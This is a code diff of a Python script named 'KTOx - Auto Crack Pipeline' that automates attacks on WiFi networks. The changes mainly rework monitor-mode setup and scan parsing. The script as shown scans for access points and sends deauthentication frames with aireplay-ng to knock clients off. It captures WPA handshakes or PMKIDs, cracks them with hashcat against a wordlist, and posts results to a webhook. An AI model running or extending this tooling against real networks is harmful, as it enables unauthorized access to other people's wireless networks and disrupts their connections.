@@ -1,15 +1,14 @@
 #!/usr/bin/env python3
 """
-KTOx - Auto Crack Pipeline
-===========================
+KTOx - Auto Crack Pipeline (Fixed Monitor Mode)
+=================================================
 Author: wickednull
 
-Fully automated WPA handshake/PMKID capture & cracking.
-- Auto-detects wlan0/wlan1, enables monitor mode
-- Scans for APs with signal bars
-- Choose any wordlist (browse filesystem)
+- Automatically detects and enables monitor mode on wlan0/wlan1
+- Scans for APs using airodump-ng with reliable CSV parsing
+- Handshake + PMKID capture
+- Any wordlist via file browser
 - Real-time hashcat progress
-- Discord notifications
 
 Controls:
   UP/DOWN  – select target
@@ -221,22 +220,39 @@ def run(cmd, timeout=30):
         return ""
 
 def get_wlan():
+    """Return first available wlan interface (wlan0, wlan1)."""
     for iface in ["wlan0", "wlan1"]:
         if os.path.exists(f"/sys/class/net/{iface}"):
             return iface
     return None
 
-def enable_mon(iface):
+def enable_monitor_mode(iface):
+    """
+    Enable monitor mode on given interface.
+    Returns the monitor interface name (e.g., wlan0mon) or None if failed.
+    """
+    # Kill interfering processes
     run("airmon-ng check kill")
+    # Try using airmon-ng (most reliable)
+    out = run(f"airmon-ng start {iface}")
+    # Look for monitor interface name
+    mon = f"{iface}mon"
+    if os.path.exists(f"/sys/class/net/{mon}"):
+        return mon
+    # Alternative naming (sometimes wlan0 -> wlan0mon)
+    # If not, maybe the interface itself is in monitor mode
+    # Check if interface is already in monitor mode
+    iw_info = run(f"iw dev {iface} info")
+    if "type monitor" in iw_info:
+        return iface
+    # Last resort: try to set manually
     run(f"ip link set {iface} down")
     run(f"iw dev {iface} set type monitor")
     run(f"ip link set {iface} up")
-    mon = f"{iface}mon"
-    if not os.path.exists(f"/sys/class/net/{mon}"):
-        run(f"airmon-ng start {iface}")
-    return mon if os.path.exists(f"/sys/class/net/{mon}") else iface
+    return iface
 
-def disable_mon(iface):
+def disable_monitor_mode(iface):
+    """Disable monitor mode and restore managed."""
     run(f"airmon-ng stop {iface}mon")
     run(f"ip link set {iface} down")
     run(f"iw dev {iface} set type managed")
@@ -247,30 +263,32 @@ def disable_mon(iface):
 # Scan for APs (robust CSV parsing)
 # ----------------------------------------------------------------------
 def scan_aps(mon):
-    draw(["Scanning 15 sec...", f"Interface: {mon}"])
+    draw([f"Scanning 15 sec...", f"Monitor: {mon}"])
     tmp = f"/tmp/ktox_scan_{int(time.time())}"
+    # Run airodump-ng for 15 seconds
     proc = subprocess.Popen(
-        f"airodump-ng --output-format csv -w {tmp} {mon}",
+        f"timeout 15 airodump-ng --output-format csv -w {tmp} {mon}",
         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     )
-    time.sleep(15)
-    proc.terminate()
+    proc.wait()
     time.sleep(1)
 
     csv_file = f"{tmp}-01.csv"
     if not os.path.exists(csv_file):
+        draw(["No CSV output", "Monitor may be down", "Check airmon-ng"], text_color="#FF8888")
         return []
 
     with open(csv_file, errors="ignore") as f:
         lines = f.readlines()
 
-    # Find header line
+    # Find header line (starts with "BSSID")
     header_idx = -1
     for i, line in enumerate(lines):
-        if "BSSID" in line and "ESSID" in line:
+        if line.strip().startswith("BSSID"):
             header_idx = i
             break
     if header_idx == -1:
+        draw(["No BSSID header", "Invalid scan output"], text_color="#FF8888")
         return []
 
     # Parse header to get column indices
@@ -281,6 +299,7 @@ def scan_aps(mon):
         col_pwr = headers.index("PWR")
         col_essid = headers.index("ESSID")
     except ValueError:
+        draw(["CSV column error", "Check airodump-ng version"], text_color="#FF8888")
         return []
 
     aps = []
@@ -328,6 +347,7 @@ def capture_hs(mon, bssid, ch, essid, deauth):
         run(f"aireplay-ng --deauth 10 -a {bssid} {mon}")
     time.sleep(20)
     proc.terminate()
+    time.sleep(1)
     caps = [f for f in os.listdir(out) if f.endswith(".cap")]
     if caps:
         return os.path.join(out, caps[0]), out
@@ -409,21 +429,33 @@ def get_predefined():
 # Main
 # ----------------------------------------------------------------------
 def main():
+    # Find wireless interface
     iface = get_wlan()
     if not iface:
-        draw(["No wireless card found", "KEY3 to exit"], text_color="#FF4444")
+        draw(["No wireless card", "Check wlan0/wlan1", "KEY3 to exit"], text_color="#FF4444")
         while wait_btn(0.5) != "KEY3":
             pass
         return
 
-    draw([f"Using {iface}", "Starting monitor mode..."])
-    mon = enable_mon(iface)
+    # Enable monitor mode
+    draw([f"Interface: {iface}", "Enabling monitor mode..."])
+    mon = enable_monitor_mode(iface)
     if not mon:
-        draw(["Monitor mode failed", "KEY3 to exit"], text_color="#FF4444")
+        draw(["Monitor mode failed", "Check airmon-ng", "KEY3 to exit"], text_color="#FF4444")
+        while wait_btn(0.5) != "KEY3":
+            pass
+        return
+    draw([f"Monitor: {mon}", "Testing..."])
+
+    # Quick test: try to get interface info
+    test = run(f"iw dev {mon} info")
+    if "monitor" not in test and "type monitor" not in test:
+        draw(["Monitor mode not active", "Try manually", "KEY3 to exit"], text_color="#FF8888")
         while wait_btn(0.5) != "KEY3":
             pass
         return
 
+    # Scan for APs
     aps = scan_aps(mon)
     if not aps:
         draw(["No APs found", "Check interface & location", "KEY3 to exit"], text_color="#FF8888")
@@ -439,6 +471,7 @@ def main():
     wl_path = pre[0][1] if pre else None
     wl_name = pre[0][0] if pre else "None"
 
+    # Target selection loop
     while True:
         bssid, ch, essid, sig = aps[cursor]
         wl_disp = wl_name if wl_idx < len(pre) else "Browse..."
@@ -486,7 +519,7 @@ def main():
                 wl_path = wl_items[wl_idx][1]
                 wl_name = wl_items[wl_idx][0]
         elif btn == "KEY3":
-            disable_mon(iface)
+            disable_monitor_mode(iface)
             GPIO.cleanup()
             return
         elif btn == "OK":
@@ -500,6 +533,7 @@ def main():
             pass
         return
 
+    # Capture handshake
     cap_file, out_dir = capture_hs(mon, bssid, ch, essid, deauth)
     is_pmkid = False
     if cap_file:
@@ -525,6 +559,7 @@ def main():
             pass
         return
 
+    # Crack
     webhook(f"Captured {essid} ({bssid}) – cracking with {wl_name}")
     draw(["Starting crack...", f"Wordlist: {wl_name}"])
     if is_pmkid:
@@ -544,7 +579,7 @@ def main():
     while wait_btn(0.5) != "KEY3":
         pass
 
-    disable_mon(iface)
+    disable_monitor_mode(iface)
     GPIO.cleanup()
 
 if __name__ == "__main__":
